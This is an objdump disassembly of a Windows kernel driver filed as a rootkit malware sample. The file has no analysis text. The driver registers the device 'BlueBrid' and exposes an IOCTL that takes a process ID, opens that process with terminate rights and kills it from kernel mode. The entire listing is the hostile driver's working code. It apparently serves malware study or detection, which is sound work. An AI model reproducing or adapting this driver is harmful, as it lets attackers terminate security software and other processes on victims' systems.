
malware_samples/rootkit/404f3111d97de7afeb1cd4f3c8b338381b7d1347b7e45ce55e218a08c2e99502.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 53                	rex push %rbx
   140001002:	48 83 ec 20          	sub    $0x20,%rsp
   140001006:	48 8d 0d 13 04 00 00 	lea    0x413(%rip),%rcx        # 0x140001420
   14000100d:	48 8b da             	mov    %rdx,%rbx
   140001010:	e8 c4 02 00 00       	call   0x1400012d9
   140001015:	33 d2                	xor    %edx,%edx
   140001017:	c7 43 30 00 00 00 00 	movl   $0x0,0x30(%rbx)
   14000101e:	48 8b cb             	mov    %rbx,%rcx
   140001021:	48 c7 43 38 00 00 00 	movq   $0x0,0x38(%rbx)
   140001028:	00 
   140001029:	ff 15 d9 0f 00 00    	call   *0xfd9(%rip)        # 0x140002008
   14000102f:	33 c0                	xor    %eax,%eax
   140001031:	48 83 c4 20          	add    $0x20,%rsp
   140001035:	5b                   	pop    %rbx
   140001036:	c3                   	ret
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	40 53                	rex push %rbx
   140001042:	48 83 ec 20          	sub    $0x20,%rsp
   140001046:	48 8d 0d c3 03 00 00 	lea    0x3c3(%rip),%rcx        # 0x140001410
   14000104d:	48 8b da             	mov    %rdx,%rbx
   140001050:	e8 84 02 00 00       	call   0x1400012d9
   140001055:	33 d2                	xor    %edx,%edx
   140001057:	c7 43 30 00 00 00 00 	movl   $0x0,0x30(%rbx)
   14000105e:	48 8b cb             	mov    %rbx,%rcx
   140001061:	48 c7 43 38 00 00 00 	movq   $0x0,0x38(%rbx)
   140001068:	00 
   140001069:	ff 15 99 0f 00 00    	call   *0xf99(%rip)        # 0x140002008
   14000106f:	33 c0                	xor    %eax,%eax
   140001071:	48 83 c4 20          	add    $0x20,%rsp
   140001075:	5b                   	pop    %rbx
   140001076:	c3                   	ret
   140001077:	cc                   	int3
   140001078:	cc                   	int3
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001085:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000108a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000108f:	55                   	push   %rbp
   140001090:	48 8b ec             	mov    %rsp,%rbp
   140001093:	48 83 ec 60          	sub    $0x60,%rsp
   140001097:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   14000109e:	48 8b f2             	mov    %rdx,%rsi
   1400010a1:	bf 10 00 00 c0       	mov    $0xc0000010,%edi
   1400010a6:	81 78 18 00 20 22 00 	cmpl   $0x222000,0x18(%rax)
   1400010ad:	0f 85 9f 00 00 00    	jne    0x140001152
   1400010b3:	83 78 10 08          	cmpl   $0x8,0x10(%rax)
   1400010b7:	73 0a                	jae    0x1400010c3
   1400010b9:	bf 23 00 00 c0       	mov    $0xc0000023,%edi
   1400010be:	e9 8f 00 00 00       	jmp    0x140001152
   1400010c3:	48 8b 42 18          	mov    0x18(%rdx),%rax
   1400010c7:	48 8b 08             	mov    (%rax),%rcx
   1400010ca:	48 85 c9             	test   %rcx,%rcx
   1400010cd:	74 7e                	je     0x14000114d
   1400010cf:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400010d3:	74 78                	je     0x14000114d
   1400010d5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400010d8:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
   1400010dc:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400010e0:	48 c7 45 18 00 00 00 	movq   $0x0,0x18(%rbp)
   1400010e7:	00 
   1400010e8:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   1400010ec:	c7 45 d0 30 00 00 00 	movl   $0x30,-0x30(%rbp)
   1400010f3:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   1400010f7:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
   1400010fe:	00 
   1400010ff:	ba 01 00 10 00       	mov    $0x100001,%edx
   140001104:	c7 45 e8 00 02 00 00 	movl   $0x200,-0x18(%rbp)
   14000110b:	f3 0f 7f 45 f0       	movdqu %xmm0,-0x10(%rbp)
   140001110:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
   140001117:	00 
   140001118:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
   14000111f:	00 
   140001120:	ff 15 1a 0f 00 00    	call   *0xf1a(%rip)        # 0x140002040
   140001126:	8b f8                	mov    %eax,%edi
   140001128:	85 c0                	test   %eax,%eax
   14000112a:	78 26                	js     0x140001152
   14000112c:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140001130:	33 d2                	xor    %edx,%edx
   140001132:	ff 15 00 0f 00 00    	call   *0xf00(%rip)        # 0x140002038
   140001138:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   14000113c:	8b d8                	mov    %eax,%ebx
   14000113e:	ff 15 ec 0e 00 00    	call   *0xeec(%rip)        # 0x140002030
   140001144:	33 ff                	xor    %edi,%edi
   140001146:	85 db                	test   %ebx,%ebx
   140001148:	0f 48 fb             	cmovs  %ebx,%edi
   14000114b:	eb 05                	jmp    0x140001152
   14000114d:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   140001152:	33 d2                	xor    %edx,%edx
   140001154:	89 7e 30             	mov    %edi,0x30(%rsi)
   140001157:	48 8b ce             	mov    %rsi,%rcx
   14000115a:	48 c7 46 38 00 00 00 	movq   $0x0,0x38(%rsi)
   140001161:	00 
   140001162:	ff 15 a0 0e 00 00    	call   *0xea0(%rip)        # 0x140002008
   140001168:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000116d:	8b c7                	mov    %edi,%eax
   14000116f:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140001173:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140001177:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   14000117b:	49 8b e3             	mov    %r11,%rsp
   14000117e:	5d                   	pop    %rbp
   14000117f:	c3                   	ret
   140001180:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001185:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000118a:	55                   	push   %rbp
   14000118b:	48 8b ec             	mov    %rsp,%rbp
   14000118e:	48 83 ec 60          	sub    $0x60,%rsp
   140001192:	48 8d 05 97 01 00 00 	lea    0x197(%rip),%rax        # 0x140001330
   140001199:	c7 45 e0 20 00 22 00 	movl   $0x220020,-0x20(%rbp)
   1400011a0:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400011a4:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400011a8:	48 8d 05 b1 01 00 00 	lea    0x1b1(%rip),%rax        # 0x140001360
   1400011af:	c7 45 f0 18 00 1a 00 	movl   $0x1a0018,-0x10(%rbp)
   1400011b6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400011ba:	41 b9 22 00 00 00    	mov    $0x22,%r9d
   1400011c0:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1400011c4:	48 c7 45 20 00 00 00 	movq   $0x0,0x20(%rbp)
   1400011cb:	00 
   1400011cc:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400011d1:	33 d2                	xor    %edx,%edx
   1400011d3:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   1400011d8:	48 8b f9             	mov    %rcx,%rdi
   1400011db:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400011e2:	00 
   1400011e3:	ff 15 27 0e 00 00    	call   *0xe27(%rip)        # 0x140002010
   1400011e9:	8b d8                	mov    %eax,%ebx
   1400011eb:	85 c0                	test   %eax,%eax
   1400011ed:	79 15                	jns    0x140001204
   1400011ef:	0f ae e8             	lfence
   1400011f2:	48 8d 0d 87 01 00 00 	lea    0x187(%rip),%rcx        # 0x140001380
   1400011f9:	8b d3                	mov    %ebx,%edx
   1400011fb:	e8 d9 00 00 00       	call   0x1400012d9
   140001200:	8b c3                	mov    %ebx,%eax
   140001202:	eb 7b                	jmp    0x14000127f
   140001204:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001208:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000120c:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001210:	83 48 30 04          	orl    $0x4,0x30(%rax)
   140001214:	ff 15 fe 0d 00 00    	call   *0xdfe(%rip)        # 0x140002018
   14000121a:	8b d8                	mov    %eax,%ebx
   14000121c:	85 c0                	test   %eax,%eax
   14000121e:	79 16                	jns    0x140001236
   140001220:	0f ae e8             	lfence
   140001223:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140001227:	ff 15 f3 0d 00 00    	call   *0xdf3(%rip)        # 0x140002020
   14000122d:	48 8d 0d 6c 01 00 00 	lea    0x16c(%rip),%rcx        # 0x1400013a0
   140001234:	eb c3                	jmp    0x1400011f9
   140001236:	48 8d 05 53 00 00 00 	lea    0x53(%rip),%rax        # 0x140001290
   14000123d:	48 89 47 68          	mov    %rax,0x68(%rdi)
   140001241:	48 8d 0d 88 01 00 00 	lea    0x188(%rip),%rcx        # 0x1400013d0
   140001248:	48 8d 05 f1 fd ff ff 	lea    -0x20f(%rip),%rax        # 0x140001040
   14000124f:	48 89 47 70          	mov    %rax,0x70(%rdi)
   140001253:	48 8d 05 a6 fd ff ff 	lea    -0x25a(%rip),%rax        # 0x140001000
   14000125a:	48 89 87 80 00 00 00 	mov    %rax,0x80(%rdi)
   140001261:	48 8d 05 18 fe ff ff 	lea    -0x1e8(%rip),%rax        # 0x140001080
   140001268:	48 89 87 e0 00 00 00 	mov    %rax,0xe0(%rdi)
   14000126f:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001273:	0f ba 70 30 07       	btrl   $0x7,0x30(%rax)
   140001278:	e8 5c 00 00 00       	call   0x1400012d9
   14000127d:	33 c0                	xor    %eax,%eax
   14000127f:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140001284:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140001289:	48 83 c4 60          	add    $0x60,%rsp
   14000128d:	5d                   	pop    %rbp
   14000128e:	c3                   	ret
   14000128f:	cc                   	int3
   140001290:	40 53                	rex push %rbx
   140001292:	48 83 ec 30          	sub    $0x30,%rsp
   140001296:	48 8b d9             	mov    %rcx,%rbx
   140001299:	c7 44 24 20 18 00 1a 	movl   $0x1a0018,0x20(%rsp)
   1400012a0:	00 
   1400012a1:	48 8d 05 b8 00 00 00 	lea    0xb8(%rip),%rax        # 0x140001360
   1400012a8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012ad:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400012b2:	ff 15 70 0d 00 00    	call   *0xd70(%rip)        # 0x140002028
   1400012b8:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400012bc:	48 85 c9             	test   %rcx,%rcx
   1400012bf:	74 06                	je     0x1400012c7
   1400012c1:	ff 15 59 0d 00 00    	call   *0xd59(%rip)        # 0x140002020
   1400012c7:	48 8d 0d 22 01 00 00 	lea    0x122(%rip),%rcx        # 0x1400013f0
   1400012ce:	e8 06 00 00 00       	call   0x1400012d9
   1400012d3:	48 83 c4 30          	add    $0x30,%rsp
   1400012d7:	5b                   	pop    %rbx
   1400012d8:	c3                   	ret
   1400012d9:	ff 25 21 0d 00 00    	jmp    *0xd21(%rip)        # 0x140002000
   1400012df:	cc                   	int3
   1400012e0:	c2 00 00             	ret    $0x0
   1400012e3:	cc                   	int3
   1400012e4:	cc                   	int3
   1400012e5:	cc                   	int3
   1400012e6:	cc                   	int3
   1400012e7:	cc                   	int3
   1400012e8:	cc                   	int3
   1400012e9:	cc                   	int3
   1400012ea:	cc                   	int3
   1400012eb:	cc                   	int3
   1400012ec:	cc                   	int3
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	cc                   	int3
   1400012f1:	cc                   	int3
   1400012f2:	cc                   	int3
   1400012f3:	cc                   	int3
   1400012f4:	cc                   	int3
   1400012f5:	cc                   	int3
   1400012f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400012fd:	00 00 00 
   140001300:	ff e0                	jmp    *%rax
   140001302:	cc                   	int3
   140001303:	cc                   	int3
   140001304:	cc                   	int3
   140001305:	cc                   	int3
   140001306:	cc                   	int3
   140001307:	cc                   	int3
   140001308:	cc                   	int3
   140001309:	cc                   	int3
   14000130a:	cc                   	int3
   14000130b:	cc                   	int3
   14000130c:	cc                   	int3
   14000130d:	cc                   	int3
   14000130e:	cc                   	int3
   14000130f:	cc                   	int3
   140001310:	cc                   	int3
   140001311:	cc                   	int3
   140001312:	cc                   	int3
   140001313:	cc                   	int3
   140001314:	cc                   	int3
   140001315:	cc                   	int3
   140001316:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000131d:	00 00 00 
   140001320:	ff 25 82 0e 00 00    	jmp    *0xe82(%rip)        # 0x1400021a8
   140001326:	cc                   	int3
   140001327:	cc                   	int3
   140001328:	cc                   	int3
   140001329:	cc                   	int3
   14000132a:	cc                   	int3
   14000132b:	cc                   	int3
   14000132c:	cc                   	int3
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	5c                   	pop    %rsp
   140001331:	00 44 00 65          	add    %al,0x65(%rax,%rax,1)
   140001335:	00 76 00             	add    %dh,0x0(%rsi)
   140001338:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   14000133e:	5c                   	pop    %rsp
   14000133f:	00 42 00             	add    %al,0x0(%rdx)
   140001342:	6c                   	insb   (%dx),(%rdi)
   140001343:	00 75 00             	add    %dh,0x0(%rbp)
   140001346:	65 00 42 00          	add    %al,%gs:0x0(%rdx)
   14000134a:	72 00                	jb     0x14000134c
   14000134c:	69 00 64 00 00 00    	imul   $0x64,(%rax),%eax
   140001352:	cc                   	int3
   140001353:	cc                   	int3
   140001354:	cc                   	int3
   140001355:	cc                   	int3
   140001356:	cc                   	int3
   140001357:	cc                   	int3
   140001358:	cc                   	int3
   140001359:	cc                   	int3
   14000135a:	cc                   	int3
   14000135b:	cc                   	int3
   14000135c:	cc                   	int3
   14000135d:	cc                   	int3
   14000135e:	cc                   	int3
   14000135f:	cc                   	int3
   140001360:	5c                   	pop    %rsp
   140001361:	00 3f                	add    %bh,(%rdi)
   140001363:	00 3f                	add    %bh,(%rdi)
   140001365:	00 5c 00 42          	add    %bl,0x42(%rax,%rax,1)
   140001369:	00 6c 00 75          	add    %ch,0x75(%rax,%rax,1)
   14000136d:	00 65 00             	add    %ah,0x0(%rbp)
   140001370:	42 00 72 00          	rex.X add %sil,0x0(%rdx)
   140001374:	69 00 64 00 00 00    	imul   $0x64,(%rax),%eax
   14000137a:	cc                   	int3
   14000137b:	cc                   	int3
   14000137c:	cc                   	int3
   14000137d:	cc                   	int3
   14000137e:	cc                   	int3
   14000137f:	cc                   	int3
   140001380:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140001382:	43 72 65             	rex.XB jb 0x1400013ea
   140001385:	61                   	(bad)
   140001386:	74 65                	je     0x1400013ed
   140001388:	44                   	rex.R
   140001389:	65 76 69             	gs jbe 0x1400013f5
   14000138c:	63 65 20             	movsxd 0x20(%rbp),%esp
   14000138f:	66 61                	data16 (bad)
   140001391:	69 6c 65 64 3a 20 30 	imul   $0x7830203a,0x64(%rbp,%riz,2),%ebp
   140001398:	78 
   140001399:	25 58 0a 00 cc       	and    $0xcc000a58,%eax
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400013a2:	43 72 65             	rex.XB jb 0x14000140a
   1400013a5:	61                   	(bad)
   1400013a6:	74 65                	je     0x14000140d
   1400013a8:	53                   	push   %rbx
   1400013a9:	79 6d                	jns    0x140001418
   1400013ab:	62 6f 6c 69 63       	(bad)
   1400013b0:	4c 69 6e 6b 20 66 61 	imul   $0x69616620,0x6b(%rsi),%r13
   1400013b7:	69 
   1400013b8:	6c                   	insb   (%dx),(%rdi)
   1400013b9:	65 64 3a 20          	gs cmp %fs:(%rax),%ah
   1400013bd:	30 78 25             	xor    %bh,0x25(%rax)
   1400013c0:	58                   	pop    %rax
   1400013c1:	0a 00                	or     (%rax),%al
   1400013c3:	cc                   	int3
   1400013c4:	cc                   	int3
   1400013c5:	cc                   	int3
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	42 6c                	rex.X insb (%dx),(%rdi)
   1400013d2:	75 65                	jne    0x140001439
   1400013d4:	42 72 69             	rex.X jb 0x140001440
   1400013d7:	64 20 6c 6f 61       	and    %ch,%fs:0x61(%rdi,%rbp,2)
   1400013dc:	64 65 64 2e 0a 00    	fs gs fs or %fs:(%rax),%al
   1400013e2:	cc                   	int3
   1400013e3:	cc                   	int3
   1400013e4:	cc                   	int3
   1400013e5:	cc                   	int3
   1400013e6:	cc                   	int3
   1400013e7:	cc                   	int3
   1400013e8:	cc                   	int3
   1400013e9:	cc                   	int3
   1400013ea:	cc                   	int3
   1400013eb:	cc                   	int3
   1400013ec:	cc                   	int3
   1400013ed:	cc                   	int3
   1400013ee:	cc                   	int3
   1400013ef:	cc                   	int3
   1400013f0:	42 6c                	rex.X insb (%dx),(%rdi)
   1400013f2:	75 65                	jne    0x140001459
   1400013f4:	42 72 69             	rex.X jb 0x140001460
   1400013f7:	64 20 75 6e          	and    %dh,%fs:0x6e(%rbp)
   1400013fb:	6c                   	insb   (%dx),(%rdi)
   1400013fc:	6f                   	outsl  (%rsi),(%dx)
   1400013fd:	61                   	(bad)
   1400013fe:	64 65 64 2e 0a 00    	fs gs fs or %fs:(%rax),%al
   140001404:	cc                   	int3
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	44                   	rex.R
   140001411:	65 76 69             	gs jbe 0x14000147d
   140001414:	63 65 20             	movsxd 0x20(%rbp),%esp
   140001417:	6f                   	outsl  (%rsi),(%dx)
   140001418:	70 65                	jo     0x14000147f
   14000141a:	6e                   	outsb  (%rsi),(%dx)
   14000141b:	65 64 2e 0a 00       	gs fs or %fs:(%rax),%al
   140001420:	44                   	rex.R
   140001421:	65 76 69             	gs jbe 0x14000148d
   140001424:	63 65 20             	movsxd 0x20(%rbp),%esp
   140001427:	63 6c 6f 73          	movsxd 0x73(%rdi,%rbp,2),%ebp
   14000142b:	65 64 2e 0a 00       	gs fs or %fs:(%rax),%al

Disassembly of section INIT:

0000000140005000 <INIT>:
   140005000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005005:	57                   	push   %rdi
   140005006:	48 83 ec 20          	sub    $0x20,%rsp
   14000500a:	48 8b da             	mov    %rdx,%rbx
   14000500d:	48 8b f9             	mov    %rcx,%rdi
   140005010:	e8 17 00 00 00       	call   0x14000502c
   140005015:	48 8b d3             	mov    %rbx,%rdx
   140005018:	48 8b cf             	mov    %rdi,%rcx
   14000501b:	e8 60 c1 ff ff       	call   0x140001180
   140005020:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005025:	48 83 c4 20          	add    $0x20,%rsp
   140005029:	5f                   	pop    %rdi
   14000502a:	c3                   	ret
   14000502b:	cc                   	int3
   14000502c:	48 8b 05 cd df ff ff 	mov    -0x2033(%rip),%rax        # 0x140003000
   140005033:	48 85 c0             	test   %rax,%rax
   140005036:	74 1b                	je     0x140005053
   140005038:	48 b9 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rcx
   14000503f:	2b 00 00 
   140005042:	48 3b c1             	cmp    %rcx,%rax
   140005045:	74 0c                	je     0x140005053
   140005047:	48 f7 d0             	not    %rax
   14000504a:	48 89 05 b7 df ff ff 	mov    %rax,-0x2049(%rip)        # 0x140003008
   140005051:	c3                   	ret
   140005052:	cc                   	int3
   140005053:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005058:	cd 29                	int    $0x29
   14000505a:	cc                   	int3
   14000505b:	cc                   	int3
   14000505c:	88 50 00             	mov    %dl,0x0(%rax)
	...
   140005067:	00 7e 51             	add    %bh,0x51(%rsi)
   14000506a:	00 00                	add    %al,(%rax)
   14000506c:	00 20                	add    %ah,(%rax)
	...
   140005086:	00 00                	add    %al,(%rax)
   140005088:	d8 50 00             	fcoms  0x0(%rax)
   14000508b:	00 00                	add    %al,(%rax)
   14000508d:	00 00                	add    %al,(%rax)
   14000508f:	00 e4                	add    %ah,%ah
   140005091:	50                   	push   %rax
   140005092:	00 00                	add    %al,(%rax)
   140005094:	00 00                	add    %al,(%rax)
   140005096:	00 00                	add    %al,(%rax)
   140005098:	fa                   	cli
   140005099:	50                   	push   %rax
   14000509a:	00 00                	add    %al,(%rax)
   14000509c:	00 00                	add    %al,(%rax)
   14000509e:	00 00                	add    %al,(%rax)
   1400050a0:	0c 51                	or     $0x51,%al
   1400050a2:	00 00                	add    %al,(%rax)
   1400050a4:	00 00                	add    %al,(%rax)
   1400050a6:	00 00                	add    %al,(%rax)
   1400050a8:	24 51                	and    $0x51,%al
   1400050aa:	00 00                	add    %al,(%rax)
   1400050ac:	00 00                	add    %al,(%rax)
   1400050ae:	00 00                	add    %al,(%rax)
   1400050b0:	36 51                	ss push %rcx
   1400050b2:	00 00                	add    %al,(%rax)
   1400050b4:	00 00                	add    %al,(%rax)
   1400050b6:	00 00                	add    %al,(%rax)
   1400050b8:	4e 51                	rex.WRX push %rcx
   1400050ba:	00 00                	add    %al,(%rax)
   1400050bc:	00 00                	add    %al,(%rax)
   1400050be:	00 00                	add    %al,(%rax)
   1400050c0:	58                   	pop    %rax
   1400050c1:	51                   	push   %rcx
   1400050c2:	00 00                	add    %al,(%rax)
   1400050c4:	00 00                	add    %al,(%rax)
   1400050c6:	00 00                	add    %al,(%rax)
   1400050c8:	6e                   	outsb  (%rsi),(%dx)
   1400050c9:	51                   	push   %rcx
	...
   1400050d6:	00 00                	add    %al,(%rax)
   1400050d8:	76 00                	jbe    0x1400050da
   1400050da:	44 62 67 50 72 69    	(bad)
   1400050e0:	6e                   	outsb  (%rsi),(%dx)
   1400050e1:	74 00                	je     0x1400050e3
   1400050e3:	00 76 04             	add    %dh,0x4(%rsi)
   1400050e6:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400050e8:	66 43 6f             	rex.XB outsw (%rsi),(%dx)
   1400050eb:	6d                   	insl   (%dx),(%rdi)
   1400050ec:	70 6c                	jo     0x14000515a
   1400050ee:	65 74 65             	gs je  0x140005156
   1400050f1:	52                   	push   %rdx
   1400050f2:	65 71 75             	gs jno 0x14000516a
   1400050f5:	65 73 74             	gs jae 0x14000516c
   1400050f8:	00 00                	add    %al,(%rax)
   1400050fa:	43 03 49 6f          	rex.XB add 0x6f(%r9),%ecx
   1400050fe:	43 72 65             	rex.XB jb 0x140005166
   140005101:	61                   	(bad)
   140005102:	74 65                	je     0x140005169
   140005104:	44                   	rex.R
   140005105:	65 76 69             	gs jbe 0x140005171
   140005108:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000510b:	00 50 03             	add    %dl,0x3(%rax)
   14000510e:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140005110:	43 72 65             	rex.XB jb 0x140005178
   140005113:	61                   	(bad)
   140005114:	74 65                	je     0x14000517b
   140005116:	53                   	push   %rbx
   140005117:	79 6d                	jns    0x140005186
   140005119:	62 6f 6c 69 63       	(bad)
   14000511e:	4c 69 6e 6b 00 00 5d 	imul   $0x35d0000,0x6b(%rsi),%r13
   140005125:	03 
   140005126:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140005128:	44                   	rex.R
   140005129:	65 6c                	gs insb (%dx),(%rdi)
   14000512b:	65 74 65             	gs je  0x140005193
   14000512e:	44                   	rex.R
   14000512f:	65 76 69             	gs jbe 0x14000519b
   140005132:	63 65 00             	movsxd 0x0(%rbp),%esp
   140005135:	00 5f 03             	add    %bl,0x3(%rdi)
   140005138:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000513a:	44                   	rex.R
   14000513b:	65 6c                	gs insb (%dx),(%rdi)
   14000513d:	65 74 65             	gs je  0x1400051a5
   140005140:	53                   	push   %rbx
   140005141:	79 6d                	jns    0x1400051b0
   140005143:	62 6f 6c 69 63       	(bad)
   140005148:	4c 69 6e 6b 00 00 6a 	imul   $0xb6a0000,0x6b(%rsi),%r13
   14000514f:	0b 
   140005150:	5a                   	pop    %rdx
   140005151:	77 43                	ja     0x140005196
   140005153:	6c                   	insb   (%dx),(%rdi)
   140005154:	6f                   	outsl  (%rsi),(%dx)
   140005155:	73 65                	jae    0x1400051bc
   140005157:	00 41 0c             	add    %al,0xc(%rcx)
   14000515a:	5a                   	pop    %rdx
   14000515b:	77 54                	ja     0x1400051b1
   14000515d:	65 72 6d             	gs jb  0x1400051cd
   140005160:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%rsi),%ebp
   140005167:	6f                   	outsl  (%rsi),(%dx)
   140005168:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000516b:	73 00                	jae    0x14000516d
   14000516d:	00 c4                	add    %al,%ah
   14000516f:	0b 5a 77             	or     0x77(%rdx),%ebx
   140005172:	4f 70 65             	rex.WRXB jo 0x1400051da
   140005175:	6e                   	outsb  (%rsi),(%dx)
   140005176:	50                   	push   %rax
   140005177:	72 6f                	jb     0x1400051e8
   140005179:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000517c:	73 00                	jae    0x14000517e
   14000517e:	6e                   	outsb  (%rsi),(%dx)
   14000517f:	74 6f                	je     0x1400051f0
   140005181:	73 6b                	jae    0x1400051ee
   140005183:	72 6e                	jb     0x1400051f3
   140005185:	6c                   	insb   (%dx),(%rdi)
   140005186:	2e 65 78 65          	cs js,pn 0x1400051ef
	...
